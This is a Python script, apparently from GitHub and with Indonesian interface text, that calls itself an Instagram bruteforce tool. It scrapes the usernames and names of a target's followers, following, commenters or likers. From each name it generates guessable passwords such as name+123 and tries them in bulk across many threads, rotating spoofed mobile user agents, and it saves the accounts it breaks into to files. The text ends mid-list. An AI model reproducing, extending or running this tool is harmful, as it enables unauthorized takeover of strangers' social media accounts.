#!/usr/bin/python3
# coding : utf-8

# Coded by : Khamdihi Dev
# Python version : 3.11.4
# Github   : https://github.com/khamdihi-dev

#- Library
import re, os, sys, json, httpx, random, urllib, hmac, hashlib, time, string, uuid, requests, base64
from concurrent.futures import ThreadPoolExecutor as ThreadPoolExec
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.tree import Tree
from datetime import datetime
from rich import print as sprint

# Instagram Api Endpoints, Array
FOLLOWING = 'https://www.instagram.com/api/v1/friendships/{id!s}/following/'
FOLLOWERS = 'https://www.instagram.com/api/v1/friendships/{id!s}/followers/'
userinfo  = 'https://i.instagram.com/api/v1/users/{id!s}/info/'
getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
login,ids,all_items,hitung,success,checkpoint = {},[],[], 0, 0, 0
pw_add = []

# Code Warna
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
Z = random.choice([P,M,H,K,B,U,O,N])

def GetFollowers(user_id, max_id, cookie) -> str:
    for y in user_id:
       try:
           HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
           PARAMS = {'count': 200,'max_id': max_id,'search_surface': 'follow_list_page'}
           urls = httpx.get(FOLLOWERS.format(**{'id': y}), params=PARAMS, headers = HEADERS)
           apcb = json.loads(urls.text)
           for yxz in apcb['users']:
               xyz = '%s<<=>>%s'%(yxz['username'], yxz['full_name'])
               if xyz not in all_items:
                  all_items.append(xyz)
                  sys.stdout.write('\r%s[%s!%s] %s%s %sAkun Berhasil Di Ambil'%(
                  N,H,N,Z,len(all_items),N)),sys.stdout.flush()
           if 'next_max_id' in apcb:
               GetFollowers(user_id, apcb['next_max_id'], cookie)
       except (httpx.RemoteProtocolError,AttributeError,httpx.ConnectError,KeyboardInterrupt,KeyError):
           pass
    if len(all_items) == 0:return False
    else:return True

def GetFollowing(user_id, max_id, cookie) -> str:
    for y in user_id:
       try:
           HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
           PARAMS = {'count': 200,'max_id': max_id,'search_surface': 'follow_list_page'}
           urls = httpx.get(FOLLOWING.format(**{'id': y}), params=PARAMS, headers = HEADERS)
           apcb = json.loads(urls.text)
           for yxz in apcb['users']:
               xyz = '%s<<=>>%s'%(yxz['username'], yxz['full_name'])
               if xyz not in all_items:
                  all_items.append(xyz)
                  sys.stdout.write('\r%s[%s!%s] %s%s %sAkun Berhasil Di Ambil'%(
                  N,H,N,Z,len(all_items),N)),sys.stdout.flush()
           if 'next_max_id' in apcb:
               GetFollowing(user_id, apcb['next_max_id'], cookie)
       except (httpx.RemoteProtocolError,AttributeError,httpx.ConnectError,KeyboardInterrupt,KeyError):
           pass
    if len(all_items) == 0:return False
    else:return True

def GetUserLikes(cookie, media_id):
    for idm in media_id:
        try:
             HEADERS = {
                 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                 'x-fb-friendly-name': 'PolarisPostLikedByListDialogQuery',
                 'content-type': 'application/x-www-form-urlencoded',
                 'x-csrftoken': re.findall('csrftoken=(.*?);',cookie)[0],
             }
             xxx  = httpx.get('https://accountscenter.instagram.com/personal_info/', cookies = {'cookie':cookie}).text
             uid  = re.findall('"actorID":"(\d+)"', str(xxx))[0]
             data = {
                 'av': uid,
                 '__d': 'www',
                 '__user': '0',
                 '__a': '1',
                 '__req': 'm',
                 '__hs': re.findall('"haste_session":"(.*?)"', str(xxx))[0],
                 'dpr': '2',
                 '__ccg': 'UNKNOWN',
                 '__rev': re.search('{"rev":(.*?)}',str(xxx)).group(1),
                 '__s': '',
                 '__hsi': re.findall('"hsi":"(\d+)"',str(xxx))[0],
                 '__dyn': '',
                 '__csr': '',
                 '__comet_req': '7',
                 'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
                 'jazoest': re.findall('&jazoest=(\d+)',str(xxx))[0],
                 'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
                 '__spin_r': re.findall('"__spin_r":(\d+)', str(xxx))[0],
                 '__spin_b': 'trunk',
                 '__spin_t': re.findall('"__spin_t":(\d+)', str(xxx))[0],
                 'fb_api_caller_class': 'RelayModern',
                 'fb_api_req_friendly_name': 'PolarisPostLikedByListDialogQuery',
                 'variables': json.dumps({"media_ids":[idm]}),
                 'server_timestamps': 'true',
                 'doc_id': '6700844413268667',
             }
             HEADERS.update({'x-fb-lsd':data['lsd']})
             response = httpx.post('https://www.instagram.com/api/graphql', cookies={'cookie':cookie}, headers=HEADERS, data=data).json()
             for i in response['data']['xdt_media_list']:
                 p = i['likers']
                 for uname in p:
                    format = '%s<<=>>%s'%(uname['username'], uname['full_name'])
                    if format not in all_items:
                       all_items.append(format)
                       sys.stdout.write('\r%s[%s!%s] %s%s %sAkun Berhasil Di Ambil'%(
                       N,H,N,Z,len(all_items),N)),sys.stdout.flush()
        except Exception as e:pass
    if len(all_items) == 0:return False
    else:return True

def GetUserComment(cookie, media_id, max_min):
    for idm in media_id:
        try:
             HEADERS = {
                 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                 'content-type': 'application/x-www-form-urlencoded',
                 'x-csrftoken': re.findall('csrftoken=(.*?);',cookie)[0],
                 'cookie': cookie
             }
             response = httpx.get(f'https://www.instagram.com/api/v1/media/{idm}/comments/?can_support_threading=true&permalink_enabled=false&min_id={max_min}', headers=HEADERS).json()
             for y in response['comments']:
                 format = '%s<<=>>%s'%(y['user']['username'], y['user']['full_name'])
                 if format not in all_items:
                    print(format)
                    all_items.append(format)
                    sys.stdout.write('\r%s[%s!%s] %s%s %sAkun Berhasil Di Ambil'%(
                    N,H,N,Z,len(all_items),N)),sys.stdout.flush()
             if 'next_min_id' in str(response):
                GetUserComment(cookie, media_id, response['next_min_id'])
        except Exception as e:pass
    if len(all_items) == 0:return False
    else:return True

def Get_id(name):
    for y in name.split(','):
        try:
            HEADERS.update({'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
            urls = httpx.get(getuserid.format(**{'nama':y}), headers=HEADERS).json()['data']['user']
            ids.append(urls['id'])
        except:pass
    return ids

def Find_MediaId(link,cokie):
    ahmasa = []
    for x in link.split(','):
        HEADERS.update({'cookie':cokie})
        req = httpx.get(x, headers=HEADERS).text
        idr = re.findall('{"media_id":"(.*?)"',str(req))
        if len(idr) == 0:pass
        else:ahmasa.append(idr[0].split('_')[0])
    return ahmasa

def Banner():
    os.system('clear' if 'Linux' in sys.platform.capitalize() else 'cls')
    return f'''{N} ___  __  __ ___ ___ ___ 
|   \|  \/  | _ ) __|_ _| {H}Premium User{N}
| |) | |\/| | _ \ _| | |  {H}Instagram Tool{N}
|___/|_|  |_|___/_| |___| {H}Bruteforce version 0.01 {N}'''

def LoginCookie():
    print(Banner())
    print(f'\n{N}[{H}!{N}] Harap Gunakan Akun Baru Untuk Login')
    cookie = input(f'[{H}?{N}] Cookie : {N}')
    try:
        HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
        curl = httpx.get(userinfo.format(**{'id': re.findall('ds_user_id=(\d+)', str(cookie))[0]}), headers=HEADERS)
        info = json.loads(curl.text)['user']['full_name']
        with open('data/cookie.txt', mode='w', encoding='utf-8') as wr:
           wr.write(f'{cookie}')
        wr.close()
        print('\n%s[%s!%s] Berhasil Login Dengan Akun %s'%(N,H,N,info))
        quit()
    except Exception as e:exit(e)

def MenuCrack():
    waktu_tersisa = 'Kontol Lo|Unlimited'
    os.system('clear' if 'Linux' in sys.platform.capitalize() else 'cls')
    try:
        cookie = open('data/cookie.txt','r').read()
        userid = re.findall('sessionid=(\d+)', str(cookie))[0]
    except (FileNotFoundError,IndexError):
        print('%s[%s!%s] Anda Belum Login/Cookie Salah'%(N,M,N));time.sleep(3);LoginCookie()
    try:
        HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
        curl = httpx.get(userinfo.format(**{'id': re.findall('ds_user_id=(\d+)', str(cookie))[0]}), headers=HEADERS)
        info = json.loads(curl.text)['user']['full_name']
    except KeyError:
        LoginCookie()
    print(Banner())
    try:print('\n%s[%s!%s] Selamat Datang : %s%s\n%s[%s!%s] Account userid : %s%s\n%s[%s!%s] Waktu Tersisa  : %s%s\n%s[%s!%s] Licensi Kamu   : %s%s'%(N,H,N,H,info,N,H,N,H,userid,N,H,N,H,waktu_tersisa.split("|")[1],N,H,N,H,base64.b64encode(waktu_tersisa.split("|")[0].encode()).decode()))
    except IndexError:print('\n%s[%s!%s] Ups, Ada Kesalahan. Silahkan Konfirmasi Ulang Licensi Kamu'%(N,M,N));time.sleep(3);exit()
    print('''%s
[%s1%s] Crack Dari List Followers
[%s2%s] Crack Dari List Following
[%s3%s] Crack Dari List Komentar
[%s4%s] Crack Dari List Menyukai
[%s5%s] Check Hasil Crack
[%s6%s] Upgrade Ke %sPremium%s
[%s0%s] Keluar\n'''%(N,H,N,H,N,H,N,H,N,H,N,H,N,H,N,M,N))
    main = input('[%s?%s] Pilih : %s'%(H,N,H))
    if main in   ['1','01']:
       print('\n%s[%s?%s] Ingin Target Lebih Dari 1?, Gunakan tanda Koma yah'%(N,H,N))
       target = input('[%s?%s] Target Name : %s'%(H,N,H))
       pikacu = Get_id(target)
       total  = GetFollowers(pikacu, '', cookie)
       if total is False:exit('\n%s[%s!%s] Upss, Sepertinya Ada Yang Error, Coba Lagi yah..'%(N,M,N))
       else:crack()
    elif main in ['2','02']:
       print('\n%s[%s?%s] Ingin Target Lebih Dari 1?, Gunakan tanda Koma yah'%(N,H,N))
       target = input('[%s?%s] Target Name : %s'%(H,N,H))
       pikacu = Get_id(target)
       total  = GetFollowing(pikacu, '', cookie)
       if total is False:exit('\n%s[%s!%s] Upss, Sepertinya Ada Yang Error, Coba Lagi yah..'%(N,M,N))
       else:crack()
    elif main in ['3','03']:
       print('\n%s[%s!%s] Masukan Link Post, Pastikan Cari Target Lebih Dari 1/2. Gunakan Tanda Koma Untuk Pemisahan'%(N,M,N))
       target = input('[%s?%s] Target Link : '%(H,N))
       find_id = Find_MediaId(target,cookie)
       total = GetUserComment(cookie, find_id,'')
       if total is False:exit('\n%s[%s!%s] Upss, Sepertinya Ada Yang Error, Coba Lagi yah..'%(N,M,N))
       else:crack()
    elif main in ['4','04']:
       print('\n%s[%s!%s] Masukan Link Post, Pastikan Cari Target Lebih Dari 1/2. Gunakan Tanda Koma Untuk Pemisahan'%(N,M,N))
       target = input('[%s?%s] Target Link : '%(H,N))
       find_id = Find_MediaId(target,cookie)
       total = GetUserLikes(cookie, find_id)
       if total is False:exit('\n%s[%s!%s] Upss, Sepertinya Ada Yang Error, Coba Lagi yah..'%(N,M,N))
       else:crack()
    elif main in ['5','05']:
       print('\n%s[%s1%s] Cek hasil akun OK\n[%s2%s] Cek hasil akun CP\n[%s3%s] Kembali ke menu\n'%(N,H,N,H,N,M,N))
       hash = input('%s[%s?%s] Pilih : '%(N,H,N))
       if hash in   ['1','01']:
          try:os.system('ul OK/OK.txt')
          except:exit('\n%s[%s!%s] Ups, ada Kesalahan coba lagi nanti'%(N,M,N))
       elif hash in ['2','02']:
          try:os.system('ul CP/CP.txt')
          except:exit('\n%s[%s!%s] Ups, ada Kesalahan coba lagi nanti'%(N,M,N))
       else:MenuCrack(waktu_tersisa)
    elif main in ['6','06']:
       text = 'Bang+Gw+Mau+Upgrade+Script+DMBFI+Ke+Premium!'
       os.system(f'xdg-open https://wa.me/+6285729416714?text={text}')
    elif main in ['0','00']:
       print('\n%s[%s!%s] Anda Mau Keluar, Apakah Mau Menghapus Data Login Juga? y/t'%(N,K,N))
       date = input('[%s?%s] Hapus Data : %s'%(K,N,M)).lower()
       if date in ['y','ya','iya']:os.system('rm -rf data/*.txt');quit(0)
       else:os.system('clear' if 'Linux' in sys.platform.capitalize() else 'cls');exit()
    else:MenuCrack(waktu_tersisa)

def crack():
    print('''\n%s
[%s1%s] Crack Menggunakan Methode (Api, i.instagram.com)
[%s2%s] Crack Menggunakan Methode (Api, www.instagram.com)
[%s3%s] Crack Menggunakan Methode (Api, api.instagram.com)\n'''%(N,H,N,H,N,H,N))
    method = input('[%s?%s] Pilih : %s'%(H,N,H))
    apsw(method)

def apsw(method):
    global karangjambu, purbalingga
    print('\n%s[%s?%s] Apa Kamu Mau Menambahkan sandi untuk crack Kali ini? (y/t)'%(N,H,N))
    weskas = input('[%s?%s] Pilih y/t : %s'%(H,N,H)).lower()
    if weskas in ['y','ya']:
       print('\n%s[%s!%s] Gunakan Tanda Koma Buat Pemisahan Yah, contohnya : bismillah,kata sandi'%(N,H,N))
       paswd = input('[%s?%s] Masukan Sandi Tambahan : %s'%(H,N,H))
       for y in paswd.split(','):
           if len(y) <=5:pass
           else:pw_add.append(y)
    else:pass
    print('\n%s[%s1%s] Library httpx (slow)\n[%s2%s] Library requests (fast)'%(N,H,N,H,N))
    lib = input('\n[%s?%s] Pilih : '%(H,N))
    if lib in ['1','01']:login.update({'Lib':'htx'})
    else:login.update({'Lib':'req'})
    print('\n%s[%s!%s] Results %sOK %sAkan Di Simpan di folder : %sOK/OK.txt\n%s[%s!%s] Results %sCP %sAkan Di Simpan di folder : %sCP/CP.txt\n%s[%s!%s] %sMode Pesawat Jika Loop Hitung Lebih dari 200%s\n'%(
N,H,N,H,N,H,
N,H,N,K,N,K,
N,H,N,K,N))
    karangjambu = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'))
    purbalingga = karangjambu.add_task('',total=len(all_items))
    with karangjambu:
       with ThreadPoolExec(max_workers=35) as pikha:
          for i in all_items:
             username, password = i.split('<<=>>')
             apacobabg = generate(password.lower())
             if method in   ['1','01']:pikha.submit(i_insta, username, apacobabg)
             elif method in ['2','02']:pikha.submit(www_insta, username, apacobabg)
             else:pikha.submit(api_insta, username, apacobabg)
    if success == 0 and checkpoint == 0:
       exit('\n%s[%s!%s] Ups, Sory Kamu Tidak Mendapatkan hasil :('%(N,M,N))
    else:
       exit('\n%s[%s!%s] Hi Kamu Mendapatkan %s akun OK dan %s akun CP'%(N,H,N,success,checkpoint))
    quit(0)

def generate(name):
    xxx = []
    if len(pw_add) >=1:
       for awokawok in pw_add:
           xxx.append(awokawok)
    for y in name.split(' '):
        if len(y) <3:pass
        elif len(y) == 3 or len(y) == 4 or len(y) == 5:
           xxx.append(y+'123')
           xxx.append(y+'1234')
           xxx.append(y+'12345')
           xxx.append(f'{y.capitalize()}123')
           xxx.append(f'{y.capitalize()}1234')
        else:
           xxx.append(y+'123')
           xxx.append(y+'1234')
           xxx.append(y+'12345')
           xxx.append(f'{y.capitalize()}123')
           xxx.append(f'{y.capitalize()}1234')
           if len(y) >=5:
              xxx.append(y)
           else:pass
           if len(name) >=5:
              xxx.append(name)
           else:pass
    return xxx

def convert_cookie(item):
    try:
        sesid = 'sessionid=' + re.findall('sessionid=(\d+)', str(item))[0]
        ds_id = 'ds_user_id=' + re.findall('ds_user_id=(\d+)', str(item))[0]
        csrft = 'csrftoken=' + re.findall('csrftoken=(.*?);', str(item))[0]
        donez = '%s; %s; %s; ig_nrcb=1; dpr=2;'%(csrft, ds_id, sesid)
    except Exception as e:
        donez = 'cookies tidak di temukan, error saat convert'
    return donez

def info(name):
    for y in name.split(','):
        try:
            HEADERS.update({'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
            urls = httpx.get(getuserid.format(**{'nama':y}), headers=HEADERS).json()['data']['user']
            peng = urls["edge_followed_by"]["count"]
            meng = urls["edge_follow"]["count"]
        except Exception as e:
            peng,meng = None, None
    return peng,meng

def UserAgent():
    rr=random.randint
    rc=random.choice
    andro=rc(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
    dpis=rc(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
    pxl=rc(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
    basa=rc(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
    kode=rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','2534478